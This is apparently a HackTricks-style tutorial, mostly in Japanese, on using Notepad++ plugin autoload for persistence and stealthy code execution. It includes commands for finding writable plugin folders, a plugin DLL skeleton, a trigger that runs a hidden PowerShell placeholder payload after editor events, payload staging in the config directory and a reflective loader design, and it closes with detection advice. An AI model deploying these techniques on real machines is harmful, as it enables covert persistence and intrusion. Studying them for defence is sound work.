# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ は起動時に、その `plugins` サブフォルダ内で見つかったすべての plugin DLL を **autoload** します。書き込み可能な Notepad++ installation の任意の場所に malicious plugin を配置すると、editor が起動するたびに `notepad++.exe` 内で code execution が得られ、これを **persistence**、気づかれにくい **initial execution**、または editor が elevated で起動された場合の **in-process loader** として悪用できます。

**Notepad++ 7.6+** では、想定される manual-install のレイアウトは plugin ごとに 1 つのサブフォルダです（`plugins\<PluginName>\<PluginName>.dll`）。**portable mode**（`notepad++.exe` の隣に `doLocalConf.xml` がある状態）では、アプリケーション全体のツリーがそのディレクトリ内にローカルのまま保持されるため、コピーされた admin tool bundles が、ユーザー書き込み可能な実行面として扱いやすくなることがよくあります。

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常、書き込みには admin 権限が必要）。
- Low-privileged operators 向けの writable options:
- **portable Notepad++ build** を user-writable なフォルダで使う。
- `C:\Program Files\Notepad++` を user-controlled なパス（例: `%LOCALAPPDATA%\npp\`）にコピーし、そこから `notepad++.exe` を実行する。
- すでに `doLocalConf.xml` を含み、`Program Files` の外に置かれている **admin tool bundles**、展開済み zip コピー、help-desk toolkits を探す。
- 各 plugin は `plugins` 配下にそれぞれ専用のサブフォルダを持ち、起動時に自動で読み込まれます。メニュー項目は **Plugins** の下に表示されます。

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ は特定の **exported functions** を期待します。これらはすべて初期化中に呼ばれ、複数の execution surface を与えます:
- **`DllMain`** — DLL load 時に即座に実行される（最初の execution point）。
- **`setInfo(NppData)`** — load 時に 1 回呼ばれ、Notepad++ のハンドルを渡す。通常は menu items の登録に使う。
- **`getName()`** — menu に表示される plugin 名を返す。
- **`getFuncsArray(int *nbF)`** — menu commands を返す。空であっても startup 中に呼ばれる。
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla の events を受け取る（user action や editor event まで payload を遅らせるのに有用）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler。より大きな data exchange に有用。
- **`isUnicode()`** — load 時に確認される compatibility flag。

ほとんどの exports は **stubs** として実装できる。execution は `DllMain` または autoload 中の上記いずれかの callback から発生しうる。

## Minimal malicious plugin skeleton
期待される exports を持つ DLL を compile し、書き込み可能な Notepad++ フォルダ配下の `plugins\\MyNewPlugin\\MyNewPlugin.dll` に配置する:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLLをビルドする (Visual Studio/MinGW)。
2. `plugins` の下に plugin サブフォルダを作成し、DLL をその中に配置する。
3. Notepad++ を再起動する。DLL は自動的に読み込まれ、`DllMain` とその後の callbacks が実行される。

## `beNotified` を使った low-noise trigger pattern
OPSEC のため、多くの payload は `DllMain` から **起動させるべきではない**。より静かな pattern は、plugin を問題なく load させたあと、**startup complete**、**buffer activation**、または **最初に入力された文字** のような現実的な editor event の後でのみ実行することだ。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
これは、うるさい `DllMain` beacon よりも public offensive research によく合致する: DLL は起動時に引き続き autoload されるが、悪意ある動作は Notepad++ が本当に使用中らしく見えるまで遅延される。

## plugin config directory を secondary storage として使う
Notepad++ は `NPPM_GETPLUGINSCONFIGDIR` を公開しており、これは **current user's plugin configuration directory** を返す。悪意ある plugin はこれを使って、ディスク上の DLL を最小限に保ちながら、encrypted config、staged payloads、または tasking files を、通常の plugin state に紛れ込む path に保存できる。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
運用上、これは次のような場合に有用です:
- 小さな autoload 対応の bootstrap DLL;
- メインの plugin binary に再度触れずに、ユーザーごとの tasking を行う;
- **autoload trigger** をより重い second stage から分離する。

## Reflective loader plugin pattern
武装された plugin は Notepad++ を **reflective DLL loader** に変えられます:
- 最小限の UI/menu エントリ（例: "LoadDLL"）を表示する。
- payload DLL を取得するための **file path** または **URL** を受け付ける。
- DLL を現在の process に reflectively map し、export された entry point（例: 取得した DLL 内の loader function）を呼び出す。
- 利点: 新しい loader を起動する代わりに、無害に見える GUI process を再利用できる; payload は `notepad++.exe` の integrity を継承する（elevated contexts も含む）。
- トレードオフ: **unsigned plugin DLL** を disk に drop するのは目立つ; 実用的な変種としては、autoloaded plugin を stub としてのみ使い、実際の implant は別の場所で encrypted/staged にしておく。

## Detection and hardening notes
- Notepad++ の plugin directories への **writes** を block するか監視する（user profiles 内の portable copies も含む）; controlled folder access または application allowlisting を有効にする。
- `plugins` 配下の **new unsigned DLLs**、portable Notepad++ trees の変更、そして `notepad++.exe` からの異常な **child processes/network activity** を alert する。
- 正規の plugins を baseline 化し、通常の Notepad++ plugin interface を export しつつ shell、PowerShell、または network beacons も起動する新しい DLL を調査する。
- plugin のインストールは **Plugins Admin** のみで行うよう強制し、信頼できない path からの portable copies の実行を制限する。

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
